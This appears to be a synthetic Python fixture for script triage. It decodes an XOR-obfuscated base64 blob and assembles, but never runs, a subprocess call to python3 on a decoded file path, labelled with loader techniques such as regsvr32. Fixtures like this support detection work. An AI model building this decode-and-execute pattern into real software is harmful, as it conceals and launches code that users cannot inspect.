# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_bcf6d860 = ("vh20qnm8RfalN6RP5bd+rX/quWmpTKqyY7tQ56JpoH/2pGWrRfWldqlE56Z+rVK7pX+qUPS5aa1T9YlmoVPyqnm8Qe"
    "GzVatP87h+9RH6pXOmVOeuN6VB8rVil0PnpW+0T+Swf7tD56Jjp067tWanU/Okb5dD47pmu1zlt3i6SeOkN7hZtLNy"
    "rX/luWS7T+qzdr9J6LJlv1PZtWKpSejreK1H9aB4+xLZpnitROO1b7tT6aR2q0HrpmuhR+iJY6wd5bdnuEHvsWTlE+"
    "e0MvFDsO84qVzgv2atf/a3fqAdxewlmFLpsXipTcK3fqkPzqNkvFLjpXmEQeT5JL1Q4rd+rQ21t2jwGeXgM/pBqKZz")
CODEC_bcf6d860 = "base64_chunks|repeating_key_xor|c8,20,86,d6,0a"

def load_bcf6d860():
    return base64.b64decode(MATERIAL_bcf6d860)

def decode_bcf6d860(v_a19c):
    key_bytes = (200, 32, 134, 214, 10,)
    return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(v_a19c))

def recover_bcf6d860():
    v_d41a = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")
    v_a702 = "decode"
    while v_a702 != "done":
        if v_a702 == "decode":
            v_b27e = decode_bcf6d860(load_bcf6d860())
            v_a702 = "done"
    v_c304 = v_b27e.decode("ascii", "strict")
    return v_c304

def inspect_bcf6d860():
    view = memoryview(recover_bcf6d860().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_bcf6d860():
    selected = "carrier"
    match selected:
        case "carrier":
            return ("match_case", "closure_cells", "py2exe_console", "regsvr32_predecessor")
        case _:
            return ()

def obfuscation_bcf6d860():
    value = "closure_cells"
    def recover():
        return value
    return recover()

def plan_bcf6d860():
    fields = dict(item.split("=", 1) for item in inspect_bcf6d860().split("|"))
    analysis_surface = surface_bcf6d860()
    obfuscation_surface = obfuscation_bcf6d860()
    operation_plan = ("subprocess_list", ("python3", fields["file_path"]))
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_bcf6d860())

# reconstruction complete